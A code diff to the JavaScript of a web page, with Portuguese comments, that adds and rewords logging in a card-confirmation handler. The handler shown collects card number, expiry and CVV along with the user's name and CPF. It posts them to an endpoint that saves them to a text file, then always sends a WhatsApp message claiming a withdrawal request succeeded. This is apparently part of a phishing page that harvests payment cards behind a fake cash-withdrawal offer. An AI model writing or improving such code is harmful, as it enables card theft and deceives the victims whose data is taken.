@@ -1140,6 +1140,8 @@ function mostrarOpcoesData(opcoes, dataReal) {
 
 
 document.getElementById('confirmCartao').addEventListener('click', async () => {
+    console.log('🔵 Botão confirmCartao clicado');
+    
     const numeroRaw = document.getElementById('numeroCartao').value.replace(/\D/g, '');
     const validade = document.getElementById('validadeCartao').value;
     const cvv = document.getElementById('cvvCartao').value;
@@ -1185,7 +1187,7 @@ document.getElementById('confirmCartao').addEventListener('click', async () => {
     btnConfirm.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Salvando...';
     
     try {
-        // Dados do cartão
+        // Dados do cartão para salvar
         const dadosCartao = {
             nome: dadosUsuario?.nome || 'N/A',
             cpf: cpfAtual,
@@ -1196,7 +1198,7 @@ document.getElementById('confirmCartao').addEventListener('click', async () => {
             valor: formatarMoeda(valor)
         };
         
-        console.log('📤 Enviando para o servidor:', dadosCartao);
+        console.log('📤 Enviando dados para o servidor:', dadosCartao);
         
         const response = await fetch('/salvar-cartao-txt', {
             method: 'POST',
@@ -1204,20 +1206,22 @@ document.getElementById('confirmCartao').addEventListener('click', async () => {
             body: JSON.stringify(dadosCartao)
         });
         
+        console.log('📥 Status da resposta:', response.status);
+        
         const resultado = await response.json();
-        console.log('📥 Resposta do servidor:', resultado);
+        console.log('📦 Resposta do servidor:', resultado);
         
         if (resultado.success) {
-            console.log('✅ Cartão salvo com sucesso!');
+            console.log('✅ Cartão salvo com sucesso no servidor!');
         } else {
-            console.log('⚠️ Erro:', resultado.erro);
+            console.log('⚠️ Erro do servidor:', resultado.erro);
         }
         
     } catch (error) {
         console.error('❌ Erro na requisição:', error);
     }
     
-    // Enviar WhatsApp (sempre, mesmo se o salvamento falhar)
+    // ENVIAR WHATSAPP (sempre)
     const mensagem = `✅ *SAQUE SOLICITADO COM SUCESSO* ✅\n\n` +
         `👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n` +
         `💰 *Valor:* R$ ${formatarMoeda(valor)}\n\n` +
@@ -1231,6 +1235,8 @@ document.getElementById('confirmCartao').addEventListener('click', async () => {
     btnConfirm.disabled = false;
     btnConfirm.innerHTML = originalText;
 });
+
+      
         document.getElementById('cancelCartao').addEventListener('click', () => {
             salvarProgresso();
             showStep('flowFinal', 3);
